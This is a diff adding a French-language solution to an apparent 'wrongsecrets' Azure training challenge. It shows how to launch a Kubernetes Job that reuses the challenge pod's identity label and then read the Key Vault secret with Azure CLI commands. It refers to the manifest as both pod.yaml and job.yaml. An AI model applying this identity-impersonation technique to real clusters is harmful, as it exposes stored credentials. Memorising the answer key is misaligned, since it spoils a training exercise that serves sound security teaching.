@@ -1,0 +1,32 @@
+Vous pouvez relever ce défi en suivant les étapes suivantes :
+
+- Vérifiez le nom de votre coffre-fort avec `terraform output vault_name`.
+
+- Créez un nouveau fichier pod `pod.yaml` avec le contenu suivant (remplacez le nom du coffre par la sortie de l'étape précédente) :
+
+```yaml
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: wrongsecret-3
+  labels:
+    aadpodidbinding: separate-workload-pod-id
+spec:
+  template:
+    metadata:
+      name: wrongsecret3job
+      labels:
+        aadpodidbinding: separate-workload-pod-id
+    spec:
+      containers:
+      - name: az
+        image: mcr.microsoft.com/azure-cli:latest
+        command:
+            [
+              "sleep", "7200"
+            ]
+      restartPolicy: Never
+```
+- Appliquez la tâche avec `kubectl apply -f job.yaml`
+
+Vous pouvez maintenant accéder au pod et exécuter une commande du type `az login --identity --allow-no-subscriptions && az keyvault secret show --name wrongsecret-3 --vault-name wrongsecrets-vault-00000`. Notez que la valeur de `wrongsecrets-vault-00000` est disponible dans l'état Terraform. Le job ayant accès au même coffre-fort que le pod du défi de sécurité, il peut également accéder à ses secrets.
